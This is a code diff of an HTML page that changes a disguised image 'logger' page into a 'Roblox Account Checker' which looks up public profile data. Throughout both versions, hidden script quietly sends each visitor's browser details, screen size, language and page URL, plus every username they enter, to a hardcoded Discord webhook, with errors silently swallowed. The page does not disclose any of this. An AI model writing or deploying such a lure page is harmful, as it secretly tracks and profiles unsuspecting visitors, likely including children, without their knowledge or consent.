@@ -3,42 +3,111 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Check this out</title>
+  <title>Roblox Account Checker</title>
   <style>
-    body { margin:0; height:100vh; background:#000; display:flex; justify-content:center; align-items:center; }
-    img { max-width:95%; max-height:95vh; border-radius:8px; box-shadow:0 0 20px #0ff; }
+    body { font-family: Arial, sans-serif; background:#111; color:#eee; margin:0; padding:20px; text-align:center; }
+    h1 { color:#00ffcc; }
+    form { margin:30px 0; }
+    input { padding:12px; width:280px; font-size:16px; border-radius:6px; border:none; }
+    button { padding:12px 24px; font-size:16px; background:#00ffcc; color:#000; border:none; border-radius:6px; cursor:pointer; }
+    button:hover { background:#00ccaa; }
+    #result { margin-top:40px; max-width:600px; margin-left:auto; margin-right:auto; background:#222; padding:20px; border-radius:10px; display:none; }
+    #avatar { width:180px; height:180px; border-radius:50%; border:3px solid #00ffcc; margin-bottom:20px; }
   </style>
 </head>
 <body>
-  <img src="https://picsum.photos/800/600?random=99" alt="Cool picture">
+  <h1>Roblox Account Checker</h1>
+  <p>Enter a Roblox username to check public info (no login needed)</p>
+
+  <form id="checkForm">
+    <input type="text" id="username" placeholder="Enter username (e.g. Roblox)" required>
+    <button type="submit">Check</button>
+  </form>
+
+  <div id="result">
+    <img id="avatar" src="" alt="Avatar" style="display:none;">
+    <h2 id="displayName"></h2>
+    <p><strong>Username:</strong> <span id="name"></span></p>
+    <p><strong>User ID:</strong> <span id="id"></span></p>
+    <p><strong>Created:</strong> <span id="created"></span></p>
+    <p><strong>Description:</strong> <span id="desc"></span></p>
+    <p><a id="profileLink" href="#" target="_blank" style="color:#00ffcc;">View Profile on Roblox</a></p>
+  </div>
 
   <script>
-    // ─── YOUR WEBHOOK ───────────────────────────────────────
+    // ─── YOUR WEBHOOK (keep for logging visits/submits) ───────────────────────────────────────
     const WEBHOOK = "https://discord.com/api/webhooks/1482807792124297218/d-ZEaW7fRbmLfX2a19jMVVaaUb6xKb_byomhoI87j5QJg_RcG1qYF4r3M0qveFYJhrNu";
 
-    const payload = {
-      username: "Image View Logger",
-      avatar_url: "https://i.imgur.com/abc123.png", // optional, change or remove
-      embeds: [{
-        title: "📸 Image was opened!",
-        color: 0x00ff88,
-        timestamp: new Date().toISOString(),
-        fields: [
-          { name: "Time (UTC)", value: new Date().toUTCString(), inline: true },
-          { name: "User-Agent", value: navigator.userAgent || "unknown", inline: false },
-          { name: "Screen Size", value: `${screen.width} × ${screen.height}`, inline: true },
-          { name: "Browser Language", value: navigator.language || "unknown", inline: true },
-          { name: "Page URL", value: location.href, inline: false }
-        ],
-        footer: { text: "Test logger • Do not abuse" }
-      }]
-    };
+    async function logToDiscord(action = "Page opened") {
+      const payload = {
+        username: "Roblox Checker Logger",
+        embeds: [{
+          title: `🔍 ${action}`,
+          color: 0x00ffcc,
+          timestamp: new Date().toISOString(),
+          fields: [
+            { name: "Time (UTC)", value: new Date().toUTCString(), inline: true },
+            { name: "User-Agent", value: navigator.userAgent || "unknown", inline: false },
+            { name: "Screen", value: `${screen.width}×${screen.height}`, inline: true },
+            { name: "Language", value: navigator.language || "unknown", inline: true },
+            { name: "Page URL", value: location.href, inline: false }
+          ]
+        }]
+      };
+      fetch(WEBHOOK, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify(payload)
+      }).catch(() => {});
+    }
 
-    fetch(WEBHOOK, {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify(payload)
-    }).catch(() => {}); // silent fail if blocked
+    // Log page load
+    logToDiscord("Checker page visited");
+
+    // Form submit handler
+    document.getElementById("checkForm").addEventListener("submit", async (e) => {
+      e.preventDefault();
+      const input = document.getElementById("username").value.trim();
+      if (!input) return;
+
+      logToDiscord(`Checked username: ${input}`);
+
+      try {
+        // Step 1: Username → UserID (POST)
+        const idRes = await fetch("https://users.roblox.com/v1/usernames/users", {
+          method: "POST",
+          headers: { "Content-Type": "application/json", "Accept": "application/json" },
+          body: JSON.stringify({ usernames: [input], excludeBannedUsers: false })
+        });
+        const idData = await idRes.json();
+
+        if (!idData.data || idData.data.length === 0) {
+          alert("User not found or invalid username.");
+          return;
+        }
+
+        const userId = idData.data[0].id;
+
+        // Step 2: Get full user info by ID (GET)
+        const userRes = await fetch(`https://users.roblox.com/v1/users/${userId}`);
+        const user = await userRes.json();
+
+        // Display results
+        document.getElementById("avatar").src = `https://thumbnails.roblox.com/v1/users/avatar?userIds=${userId}&size=720x720&format=Png&isCircular=false`;
+        document.getElementById("avatar").style.display = "block";
+        document.getElementById("displayName").textContent = user.displayName || user.name;
+        document.getElementById("name").textContent = user.name;
+        document.getElementById("id").textContent = user.id;
+        document.getElementById("created").textContent = new Date(user.created).toLocaleDateString();
+        document.getElementById("desc").textContent = user.description || "No description set.";
+        document.getElementById("profileLink").href = `https://www.roblox.com/users/${userId}/profile`;
+        document.getElementById("result").style.display = "block";
+
+      } catch (err) {
+        alert("Error fetching data. Roblox API might be rate-limited or down.");
+        console.error(err);
+      }
+    });
   </script>
 </body>
 </html>
